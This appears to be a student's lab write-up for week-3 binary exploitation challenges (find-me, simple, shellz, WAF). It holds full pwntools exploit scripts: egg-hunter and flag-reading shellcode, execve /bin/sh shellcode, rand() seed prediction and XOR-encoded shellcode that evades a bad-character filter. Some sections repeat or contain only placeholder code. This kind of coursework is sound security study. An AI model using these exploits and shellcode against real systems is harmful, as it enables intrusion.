# Find-me

===========================

General overview of problems faced
-------------------------------------

 checksec find-me
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/k-730/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/home/k-730/COMP6447/wk3/find-me'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

00401352  4883ec40           sub     rsp, 0x40
=> So stack frame is most likely 0x40 = 64 bytes
Stack frame always changing!

Our stack is at:
contents is printed at $rbp-0x30

Bad chars are 0xf,0x5! We cant use syscall!

This means we have to use the opened fd = 1000
file discriptor to read the contents of the flag!! From file descriptor

Should the small shellcode look for the bigger shellcode? YES!

Interesting, another file descriptor for the flag is opened @0x0040158c! Perhaps we must use this!

flag size is 190 bytes, meaning we must read atleast 190 bytes

Big buffer is: location is at:
b *main+1006

OMG we could just use call and pop to get close to the big shellcode!!!

I thought direction was increment by 1! Yes correct!, Not downwards as mmap usually adds data!!

My shellcode exceeded 30 bytes, before! Limit is not 30 bytes as seen in memory but actually 28 bytes!

Originally thought 4 byte tag/signature for big shellcode is enough BUT NOT!

Need 8 byte TAG/Signature

Script/Command used
------------------

```
from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "find-me").resolve().__str__()
BIG_BUFF_SIZE = 256
FD = 1000

gdb_script = """
b *main
b *main+1006
b *main+1161
c
"""


# open-fd2.s
# Big shellcode max size = 256
BigAsm = """
_start:
    xor     eax, eax            
    mov     edi, 1000
    sub     rsp, 0x400
    mov     rsi, rsp
    mov     edx, 0x400
    syscall                     

    mov     edx, eax
    mov     edi, 1              
    mov     eax, 1              
    syscall

    xor     edi, edi
    mov     eax, 60             
    syscall
"""
# above shellcode is 47 bytes.... Put it in the big stack
# WE NEED THE EXIT(0)

BigShellCode = asm(BigAsm, extract=True, arch="amd64", os="linux")
BigShellCodeLen = len(BigShellCode)
print("____________________________________")

print(f"Big Shellcode: {BigShellCode}")
print(f"Big Shellcode length: {BigShellCodeLen}")


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvuntil(delims="new stack")
print("____________________________________")
print(res)

print("____________________________________")
# Get the stack address
res = io.recvline()
res = io.recvlinesS(1)
print(res)
match = re.search(r"0x[0-9a-fA-F]+", res[0])
stck_addr = match.group(0)
print(f"stack address received: {stck_addr}")
stack_addr_int = int(stck_addr, 16)


NOP = b"\x90"
Signature = 8 * b"\x90"
BigPayload = NOP * (16 - BigShellCodeLen % 16 + len(Signature)) + BigShellCode

# THIS WORKS
# loopSHellCodeBare.s
OFFSET = 1_000_000
stack_addr_int = stack_addr_int + OFFSET

# smallAsm = f"""
# _start:
#     mov rsi, {hex(stack_addr_int)}
#     mov eax, 0x90909090
# findNOP:
#     cmp dword [rsi], eax
#     je found
#     dec rsi
#     jmp findNOP
# found:
#     jmp [rsi+4]
# """
signature = u64(Signature)

smallAsm = f"""
    mov rbx,{hex(signature)}
    call tmp
tmp:  
    pop rsi
loop:  
    cmp qword ptr [rsi],rbx
    je fin
    inc rsi
    jmp loop
fin:  
    jmp rsi
"""

# smallAsm = f"""
# _start:
#     mov rsi, rsp
#     mov rax, 0x7430307730303077
# Loop:
#     cmp qword [rsi], rax
#     je  Fin
#     inc rsi
#     jmp Loop
# Fin:
#     add rsi, 8
#     jmp rsi
# """
# bfc03190
smallShellCode = asm(smallAsm, extract=True, arch="amd64", os="linux")
smallShellCodeLen = len(smallShellCode)


print("____________________________________")

print(f"small Shellcode: {smallShellCode.hex()}")
# print(f"small Shellcode: {smallShellCode}")
print(f"small Shellcode length: {smallShellCodeLen}")
print(f"disassm: {disasm(smallShellCode)}")

print("____________________________________")
print(f"Sending small shellcode")
io.sendline(smallShellCode)

print("____________________________________")
print(f"Sending big shellcode")
print(f"Big payload len: {len(BigPayload)}")
print(f"Big payload: {(BigPayload.hex())}")

print(BigPayload)
io.sendline(BigPayload)


io.interactive()

```

SIMPLE
===========================

Open file descriptor = 1000
Read contents from fd
write into the buffer
make the shellcode do this:

read(fd, buff, size)
write(1, buf, nread)
exit(0)

===========================

General overview of problems faced
-------------------------------------

* Shell code needed to be debugged

* Need to use syscall read, write and exit so the program does not crash

* This big shellcode can be used for egg hunting in find-me!!

* Ensure buffer is correct size

Script/Command used
------------------

```
from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "simple").resolve().__str__()
BUFF_SIZE = 2048

gdb_script = """
b *main
b *main+372
b *main+483
c
"""
# open-fd.s
# myAsm = """

#     lea rsi, [rsp]
#     mov rdi, 1000
#     xor rax, rax
#     mov dl, 190
#     syscall

#     mov al, 1
#     mov dil, 1
#     mov dl, 190
#     syscall

#     mov eax, 60
#     xor rdi, rdi
#     syscall
# """

myAsm = """
    xor     eax, eax            
    mov     edi, 1000
    sub     rsp, 0x400
    mov     rsi, rsp
    mov     edx, 0x400
    syscall                     

    mov     edx, eax
    mov     edi, 1              
    mov     eax, 1              
    syscall

    xor     edi, edi
    mov     eax, 60             
    syscall

"""
# WE NEED THE EXIT(0)

shellcode = asm(myAsm, extract=True, arch="amd64", os="linux")
shellcode_len = len(shellcode)
print("____________________________________")

print(f"Shellcode: {shellcode}")
print(f"Shellcode length: {shellcode_len}")


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
print("____________________________________")
# Get the file descriptor
FD = 1000


print("____________________________________")
# Get the stack address
res = io.recvuntil(":")
print(f"stack address received: {res}")


# le = p64(int(CANARY, 16), "little")
# be = p64(int(CANARY, 16), endianness="big")
NOP = b"\x90"
# This works
# payload = NOP * (16 - shellcode_len % 16) + shellcode

# This works too!
payload = NOP * (BUFF_SIZE - shellcode_len) + shellcode
# payload = shellcode + NOP * (BUFF_SIZE - shellcode_len)

# payload = shellcode
# print(f"Sending payload: {payload}")

# io.sendline(payload)
# io.interactive()

print("____________________________________")
print(f"Sending small shellcode")
io.sendline(payload)
res = io.recvall().decode("ascii")
print(res)
```

Shellz
===========================

Open file descriptor = 1000
Read contents from fd
write into the buffer
make the shellcode do this:

read(fd, buff, size)
write(1, buf, nread)
exit(0)

===========================

General overview of problems faced
-------------------------------------

* Shell code needed to be debugged

* Need to use syscall read, write and exit so the program does not crash

* This big shellcode can be used for egg hunting in find-me!!

* Ensure buffer is correct size

Script/Command used
------------------

```
print "world hello"
```

Shellz
===========================

└─$ checksec shellz
[*] '/home/k-730/COMP6447/wk3/shellz'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

printf("Here is a random stack address: …", (int64_t)(rand() % 500) + &buf, &buf);
So stack is located at:
stack = leaked_stack + random
somewhere!

Now rsp is 0x2000 = 8192 bytes in size

possible attack paths
OMFG i just have to loop thru 500 of the bytes to find the buffer address
Use the c rand function in python to try and get the flag.

Best way is to predict the rand:

Predict rand() (best)

WTF why does the order of the payload matter?

General overview of problems faced
-------------------------------------

* Shell code needed to be debugged

* Shellcode needs to be 16byte aligned!

* For some reason I cannot put the shellcode at the very end! Needs to be somewhere in the buffer

Script/Command used
------------------

```
print "world hello"
```

Shellz
===========================

Open file descriptor = 1000
Read contents from fd
write into the buffer
make the shellcode do this:

read(fd, buff, size)
write(1, buf, nread)
exit(0)

===========================

General overview of problems faced
-------------------------------------

* Shell code needed to be debugged

* Need to use syscall read, write and exit so the program does not crash

* This big shellcode can be used for egg hunting in find-me!!

* Ensure buffer is correct size

Script/Command used
------------------

```
from pwn import *
import re, time, random
from ctypes import CDLL, c_uint, c_int, byref

# 6447.lol 3002
PROGRAM_PATH = (Path(__file__).parent / "shellz").resolve().__str__()
BUFF_SIZE = 8192 + 8  # 0x2000
SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
Shellcode2 = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

PAYLOAD_SIZE = len(SHELL_CODE)
WRAP_AROUND = 500

gdb_script = """
b *vuln+62
b *vuln+104
b *vuln+138
c
"""

gdb_script2 = """
b *vuln+62
b *vuln+189
c
"""

# gdb_script = """
# b *main
# b *vuln
# b *vuln+104
# c
# """


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")

# Random seed
# TODO: We are 1 second off! CHECK

libc = CDLL("libc.so.6")  # glibc on Linux
libc.srand.argtypes = [c_uint]
libc.rand.restype = c_int
libc.rand_r.argtypes = [
    c_uint.__class__,
]  # see rand_r example below

seed = math.trunc(time.time())
print(f"Time now is: {seed}")
print(f"Time now is: {hex(seed)}")
# Basic (global-state) rand/srand — same semantics as C
libc.srand(seed)
x = libc.rand()  # first C rand()
print(f"Random seeded with timeNow is: {x}")
print(f"Random seeded with timeNow is: {hex(x)}")

offset = x % 500
print(f"offset R is: {offset}")
print(f"offset R is: {hex(offset)}")
byte_align = 16 - (offset % 16)
print(f"offset R mod 16 is: {offset % 16}")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script2, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvuntil(delims=":")
print("____________________________________")


print("____________________________________")
print(res)

print("____________________________________")
# Get the stack address
res = io.recvlinesS(1)
# print(res)
match = re.search(r"0x[0-9a-fA-F]+", res[0])
stck_addr = match.group(0)
print(f"stack address received: {stck_addr}")

int_stack_addr = int(stck_addr, 16)
print(f"stack address in int: {int_stack_addr}")

int_buffer_addr = int_stack_addr - offset
buffer_addr = hex(int_buffer_addr)
print(f"buffer address in int: {int_buffer_addr}")
print(f"buffer address hex: {buffer_addr}")


# le = p64(int(CANARY, 16), "little")
# be = p64(int(CANARY, 16), endianness="big")
MODULO = 500
NOP_SLED_SIZE = 532  # 16 byte aligned!
NOP_SIZE = NOP_SLED_SIZE + byte_align + 5
# Byte align the shellcode
NOP = b"\x90"
payload = (
    NOP * (BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)
    + SHELL_CODE
    + NOP * (NOP_SIZE)
    + p64(int_stack_addr, endianness="little")
)

# TODO: WHY DOES THIS NOT WORK
# payload = (
#     NOP * (BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)
#     + NOP * (NOP_SIZE)
#     + SHELL_CODE
#     + p64(int_stack_addr, endianness="little")
# )

# print(f"Payload is: {payload}")
print(f"Payload len is: {len(payload)}")
print(f"Payload len is: {(BUFF_SIZE - NOP_SIZE - PAYLOAD_SIZE)}")


# 0x7ffcac397d6a

# imul = 0x10624DD3
# shr = 0x20  # 32
# sar = 0x5
# sar2 = 0x1F  # 31
# imul2 = 0x1F4  # 500


# io.sendline(payload)
print("____________________________________")
print(f"Sending payload with shellcode")
io.sendline(payload)
# res = io.recvlines(1)
# print(res)
io.interactive()

```

WAF
===========================

└─$ checksec WAF
[*] '/home/k-730/COMP6447/wk3/waf'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

Badchars: abcdefghijklmonpqurtsABCD/binshh
Need to create shellcode that avoids these characters

Send these characters over to the buffer.

frame size = 0x110
RIP = 8

Therefore buff attack size = 0x110 + 8 = 0x118 bytes

Please pad the shellcode with NOPS just in case!

Then overrite the return address for bufferoverflow

General overview of problems faced
-------------------------------------

* Shellcode needs some badchars to be excluded
* NOP is okay!
* Hmm, sometimes it gets triggered!!
*

Script/Command used
------------------

```
from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "waf").resolve().__str__()
BUF_SIZE = 0x110 + 8  # 272 + 8
# BUF_SIZE = 264

FD = 1000
# buf_len = len(buf)
# \x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6F\x6E\x70\x71\x75\x72\x74\x73\x41\x42\x43\x44\x2F\x62\x69\x6E\x73\x68\x68
# 61,62,63,64,65,66,67,68,69,6A,6B,6C,6D,6F,6E,70,71,75,72,74,73,41,42,43,44,2F,62,69,6E,73,68,68
badChar = "abcdefghijklmonpqurtsABCD/binshh".encode("ascii")
badChar = badChar.hex()

secret_key = 0xFF_FF_FF_FF_FF_FF_FF_FF
binsh = u64(b"/bin/sh\x00")
bish_encrypted = binsh ^ 0xFF_FF_FF_FF_FF_FF_FF_FF
EXECVE = 0x3B

shellcode = f""" 
mov rax, {EXECVE}
xor rdx, rdx
xor rsi, rsi
mov rbx, {bish_encrypted}
xor rbx, 0xFFFFFFFFFFFFFFFF
push rbx
mov rdi, rsp
syscall
"""

buf: bytes = asm(shellcode, arch="amd64", os="linux")

buf_len = len(buf)
NOP = b"\x90"
PADDING = NOP * (16 - buf_len % 16)


# b *vuln
gdb_script = """
b *firewall_check
b *firewall_check+64
b *firewall_check+110
b *firewall_check+147
b *vuln+181
c
"""
print("____________________________________")
print(f"Len of buffer: {buf_len}")
print(f"Disasm: {disasm(buf)}")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvuntil(delims=": ")
print("____________________________________")
print(res)


# Get the stack address
print("____________________________________")
stack_addr = io.recvline().decode("ascii").strip()
print(f"Our buffer address received: {stack_addr}")
stack_addr_int = int(stack_addr, 16)

payload = (
    PADDING + buf + (BUF_SIZE - len(PADDING) - buf_len) * NOP + p64(stack_addr_int)
)


# print("____________________________________")
# Get the stack address
# res = io.recvlines(2)
# print(res)
print(f"Sending payload")
io.sendline(payload)

print("____________________________________")
# res = io.recvline()
# print(res)

io.interactive()
```
